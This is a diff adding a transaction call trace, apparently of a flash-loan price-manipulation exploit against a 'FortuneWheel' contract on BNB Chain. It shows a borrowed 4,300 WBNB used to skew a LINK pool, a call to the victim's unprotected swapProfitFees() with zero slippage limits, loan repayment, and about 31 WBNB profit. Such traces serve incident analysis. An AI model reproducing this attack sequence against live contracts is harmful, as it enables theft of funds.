@@ -1,0 +1,81 @@
+[1][CREATE] from=0xf1e731, to=0xe40ab1, atInversebrahint248() -> None
+  [2][CREATE] from=0xe40ab1, to=0x818cd7, atInversebrahint248() -> 0x608060
+  [2][CALL] from=0xe40ab1, to=0x818cd7, flashloanaddress() -> None
+    [3][STATICCALL] from=0x818cd7, to=PancakeV3Pool, token0() -> 0x55d398
+    [3][CALL] from=0x818cd7, to=PancakeV3Pool, flash(recipient(address): 0x818CD7, amount0(uint256): 0, amount1(uint256): 4300000000000000000000, data(bytes): b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00...) -> None
+      [4][STATICCALL] from=PancakeV3Pool, to=BEP20USDT, balanceOf(account(address): 0x172fcD) -> 3178686471569296579127296
+      [4][STATICCALL] from=PancakeV3Pool, to=WBNB, balanceOf((address): 0x172fcD) -> 4478385724514701387203
+      [4][CALL] from=PancakeV3Pool, to=WBNB, transfer(dst(address): 0x818CD7, wad(uint256): 4300000000000000000000) -> True
+      [4][CALL] from=PancakeV3Pool, to=0x818cd7, 0xa1d48336() -> None
+        [5][STATICCALL] from=0x818cd7, to=WBNB, balanceOf((address): 0x818CD7) -> 4300000000000000000000
+        [5][STATICCALL] from=0x818cd7, to=WBNB, balanceOf((address): 0x818CD7) -> 4300000000000000000000
+        [5][STATICCALL] from=0x818cd7, to=WBNB, allowance((address): 0x10ED43) -> 0
+        [5][CALL] from=0x818cd7, to=WBNB, approve(guy(address): 0x10ED43, wad(uint256): 115792089237316195423570985008687907853269...) -> True
+        [5][CALL] from=0x818cd7, to=PancakeRouter, swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn(uint256): 4300000000000000000000, amountOutMin(uint256): 0, path(address[]): ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc09..., to(address): 0x818CD7, deadline(uint256): 1736502001) -> None
+          [6][CALL] from=PancakeRouter, to=WBNB, transferFrom(src(address): 0x818CD7, dst(address): 0x824eb9, wad(uint256): 4300000000000000000000) -> True
+          [6][STATICCALL] from=PancakeRouter, to=BEP20LINK, balanceOf(account(address): 0x818CD7) -> 0
+          [6][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['575059722221790815001', '19683020234934991242367', '1736501716']
+          [6][STATICCALL] from=PancakeRouter, to=WBNB, balanceOf((address): 0x824eb9) -> 4875059722221790815001
+          [6][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 17356089427655381925726, to(address): 0x818CD7, data(bytes): b'') -> None
+            [7][CALL] from=PancakePair, to=BEP20LINK, transfer(recipient(address): 0x818CD7, amount(uint256): 17356089427655381925726) -> True
+            [7][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x824eb9) -> 4875059722221790815001
+            [7][STATICCALL] from=PancakePair, to=BEP20LINK, balanceOf(account(address): 0x824eb9) -> 2326930807279609316641
+          [6][STATICCALL] from=PancakeRouter, to=BEP20LINK, balanceOf(account(address): 0x818CD7) -> 17356089427655381925726
+        [5][CALL] from=0x818cd7, to=FortuneWheel, swapProfitFees() -> None
+          [6][STATICCALL] from=FortuneWheel, to=PancakeRouter, getAmountsIn(amountOut(uint256): 48090000000000000000, path(address[]): ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc09...) -> [103135416163530787817, 48090000000000000000]
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['4875059722221790815001', '2326930807279609316641', '1736502001']
+          [6][STATICCALL] from=FortuneWheel, to=PancakeRouter, getAmountsOut(amountIn(uint256): 17600400000000000000, path(address[]): ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc09...) -> [17600400000000000000, 8349832622427605647]
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['4875059722221790815001', '2326930807279609316641', '1736502001']
+          [6][STATICCALL] from=FortuneWheel, to=PancakeRouter, getAmountsIn(amountOut(uint256): 22020000000000000000, path(address[]): ['0x4D9927a8Dc4432B93445dA94E4084D29243893...) -> [217902307222553107209870, 46690682950839373836, 22020000000000000000]
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['4875059722221790815001', '2326930807279609316641', '1736502001']
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['121263025417142429893090', '72739253315769478301', '1736491495']
+          [6][STATICCALL] from=FortuneWheel, to=PancakeRouter, getAmountsOut(amountIn(uint256): 36597855250000000000000, path(address[]): ['0x4D9927a8Dc4432B93445dA94E4084D29243893...) -> [36597855250000000000000, 16831183026189930161, 7986159668894686738]
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['121263025417142429893090', '72739253315769478301', '1736491495']
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['4875059722221790815001', '2326930807279609316641', '1736502001']
+          [6][CALL] from=FortuneWheel, to=BNBP, approve(spender(address): 0x10ED43, amount(uint256): 36597855250000000000000) -> True
+          [6][CALL] from=FortuneWheel, to=PancakeRouter, swapExactTokensForETH(amountIn(uint256): 36597855250000000000000, amountOutMin(uint256): 0, path(address[]): ['0x4D9927a8Dc4432B93445dA94E4084D29243893..., to(address): 0x384b9f, deadline(uint256): 1736502001) -> [36597855250000000000000, 16831183026189930161]
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['121263025417142429893090', '72739253315769478301', '1736491495']
+            [7][CALL] from=PancakeRouter, to=BNBP, transferFrom(from(address): 0x384b9f, to(address): 0x4C736d, amount(uint256): 36597855250000000000000) -> True
+              [8][STATICCALL] from=BNBP, to=PancakeFactory, getPair((address): 0xbb4CdB) -> 0x4c736d
+            [7][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 16831183026189930161, to(address): 0x10ED43, data(bytes): b'') -> None
+              [8][CALL] from=PancakePair, to=WBNB, transfer(dst(address): 0x10ED43, wad(uint256): 16831183026189930161) -> True
+              [8][STATICCALL] from=PancakePair, to=BNBP, balanceOf(account(address): 0x4C736d) -> 157860880667142429893090
+              [8][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x4C736d) -> 55908070289579548140
+            [7][CALL] from=PancakeRouter, to=WBNB, withdraw(wad(uint256): 16831183026189930161) -> None
+              [8][CALL][16.83118302618993] from=WBNB, to=PancakeRouter
+            [7][CALL][16.83118302618993] from=PancakeRouter, to=FortuneWheel
+          [6][CALL] from=FortuneWheel, to=PancakeRouter, swapExactETHForTokens(amountOutMin(uint256): 0, path(address[]): ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc09..., to(address): 0x384b9f, deadline(uint256): 1736502001) -> [34431583026189930161, 16278878565747828785]
+            [7][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['4875059722221790815001', '2326930807279609316641', '1736502001']
+            [7][CALL] from=PancakeRouter, to=WBNB, deposit() -> None
+            [7][CALL] from=PancakeRouter, to=WBNB, transfer(dst(address): 0x824eb9, wad(uint256): 34431583026189930161) -> True
+            [7][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 16278878565747828785, to(address): 0x384b9f, data(bytes): b'') -> None
+              [8][CALL] from=PancakePair, to=BEP20LINK, transfer(recipient(address): 0x384b9f, amount(uint256): 16278878565747828785) -> True
+              [8][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x824eb9) -> 4909491305247980745162
+              [8][STATICCALL] from=PancakePair, to=BEP20LINK, balanceOf(account(address): 0x824eb9) -> 2310651928713861487856
+          [6][CALL] from=FortuneWheel, to=BEP20LINK, approve(spender(address): 0x1FCc3B, amount(uint256): 16278878565747828785) -> True
+          [6][CALL] from=FortuneWheel, to=PegSwap, swap(amount(uint256): 16278878565747828785, source(address): 0xF8A0BF, target(address): 0x404460) -> None
+            [7][CALL] from=PegSwap, to=BEP20LINK, transferFrom(sender(address): 0x384b9f, recipient(address): 0x1FCc3B, amount(uint256): 16278878565747828785) -> True
+            [7][CALL] from=PegSwap, to=LinkToken, transfer(_to(address): 0x384b9f, _value(uint256): 16278878565747828785) -> True
+          [6][CALL] from=FortuneWheel, to=LinkToken, transferAndCall(_to(address): 0xc587d9, _value(uint256): 16278878565747828785, _data(bytes): b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00...) -> True
+            [7][CALL] from=LinkToken, to=VRFCoordinatorV2, onTokenTransfer((address): 0x384b9f, amount(uint256): 16278878565747828785, data(bytes): b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00...) -> None
+        [5][STATICCALL] from=0x818cd7, to=BEP20LINK, balanceOf(account(address): 0x818CD7) -> 17356089427655381925726
+        [5][STATICCALL] from=0x818cd7, to=BEP20LINK, allowance(owner(address): 0x818CD7, spender(address): 0x10ED43) -> 0
+        [5][CALL] from=0x818cd7, to=BEP20LINK, approve(spender(address): 0x10ED43, amount(uint256): 115792089237316195423570985008687907853269...) -> True
+        [5][CALL] from=0x818cd7, to=PancakeRouter, swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn(uint256): 17356089427655381925726, amountOutMin(uint256): 0, path(address[]): ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51..., to(address): 0x818CD7, deadline(uint256): 1736502001) -> None
+          [6][CALL] from=PancakeRouter, to=BEP20LINK, transferFrom(sender(address): 0x818CD7, recipient(address): 0x824eb9, amount(uint256): 17356089427655381925726) -> True
+          [6][STATICCALL] from=PancakeRouter, to=WBNB, balanceOf((address): 0x818CD7) -> 0
+          [6][STATICCALL] from=PancakeRouter, to=PancakePair, getReserves() -> ['4909491305247980745162', '2310651928713861487856', '1736502001']
+          [6][STATICCALL] from=PancakeRouter, to=BEP20LINK, balanceOf(account(address): 0x824eb9) -> 19666741356369243413582
+          [6][CALL] from=PancakeRouter, to=PancakePair, swap(amount0Out(uint256): 4331398120414037532669, amount1Out(uint256): 0, to(address): 0x818CD7, data(bytes): b'') -> None
+            [7][CALL] from=PancakePair, to=WBNB, transfer(dst(address): 0x818CD7, wad(uint256): 4331398120414037532669) -> True
+            [7][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x824eb9) -> 578093184833943212493
+            [7][STATICCALL] from=PancakePair, to=BEP20LINK, balanceOf(account(address): 0x824eb9) -> 19666741356369243413582
+          [6][STATICCALL] from=PancakeRouter, to=WBNB, balanceOf((address): 0x818CD7) -> 4331398120414037532669
+        [5][STATICCALL] from=0x818cd7, to=WBNB, balanceOf((address): 0x818CD7) -> 4331398120414037532669
+        [5][CALL] from=0x818cd7, to=WBNB, transfer(dst(address): 0x172fcD, wad(uint256): 4300430000000000000000) -> True
+        [5][STATICCALL] from=0x818cd7, to=WBNB, balanceOf((address): 0x818CD7) -> 30968120414037532669
+        [5][STATICCALL] from=0x818cd7, to=WBNB, balanceOf((address): 0x818CD7) -> 30968120414037532669
+        [5][CALL] from=0x818cd7, to=WBNB, transfer(dst(address): 0xf1e731, wad(uint256): 30968120414037532669) -> True
+      [4][STATICCALL] from=PancakeV3Pool, to=BEP20USDT, balanceOf(account(address): 0x172fcD) -> 3178686471569296579127296
+      [4][STATICCALL] from=PancakeV3Pool, to=WBNB, balanceOf((address): 0x172fcD) -> 4478815724514701387203
+  [2][SELFDESTRUCT][0.0] from=0xe40ab1, to=0xf1e731
